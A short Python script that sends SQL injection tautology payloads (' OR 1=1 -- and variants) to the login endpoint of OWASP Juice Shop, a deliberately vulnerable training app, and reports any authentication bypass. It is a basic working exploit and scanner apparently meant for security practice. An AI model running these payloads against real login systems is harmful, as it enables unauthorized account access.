import requests
from urllib.parse import urljoin

def test_sqli(url):
    # Test the login API endpoint (known vulnerable in Juice Shop)
    login_url = urljoin(url, "/rest/user/login")
    payloads = [
        "' OR 1=1 -- ",         # Basic SQLi
        "' OR '1'='1' -- ",     # Classic tautology
        "\" OR 1=1 -- "         # Double quote variant
    ]
    
    for payload in payloads:
        data = {"email": f"test{payload}", "password": "anything"}
        try:
            response = requests.post(login_url, json=data)
            
            # Check for successful bypass (200 OK + JSON response)
            if response.status_code == 200 and "authentication" in response.json():
                print(f"[!] SQLi Vulnerability FOUND with payload: {payload}")
                return
        except Exception as e:
            print(f"Error testing payload {payload}: {e}")
    
    print("[+] No SQLi vulnerabilities detected.")

if __name__ == "__main__":
    target_url = "https://juice-shop.herokuapp.com"  # Ethical testing only
    test_sqli(target_url)